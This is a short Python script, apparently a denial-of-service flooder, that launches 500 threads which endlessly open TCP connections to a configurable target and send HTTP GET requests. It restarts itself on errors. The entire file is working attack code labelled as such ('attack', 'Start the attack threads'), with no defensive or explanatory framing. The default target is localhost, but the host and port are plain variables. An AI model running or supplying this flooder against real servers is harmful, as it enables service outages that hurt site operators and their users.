import threading 
import socket  
import os  
import sys  

# target IP and port
target = '127.0.0.1'
port = 5000

already_connected = 0  

def restart_program():
    python = sys.executable
    os.execl(python, python, *sys.argv)

def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # Create a TCP socket
        try:
            s.connect((target, port)) # Connect to the target
            s.send(("GET / HTTP/1.1\r\n").encode('ascii'))  # Send an HTTP GET request
            s.send(("Host: " + target + "\r\n\r\n").encode('ascii'))  # Send the host header information
            s.close()  # Close the socket

            global already_connected
            already_connected += 1
            if already_connected % 500 == 0:  # Print the connection count every 500 connections
                print(already_connected)
        except socket.error as e:
            print("Socket error:", e)
            restart_program()  # Restart the program in case of an error

# Start the attack threads
for i in range(500):
    thread = threading.Thread(target=attack)
    thread.start()
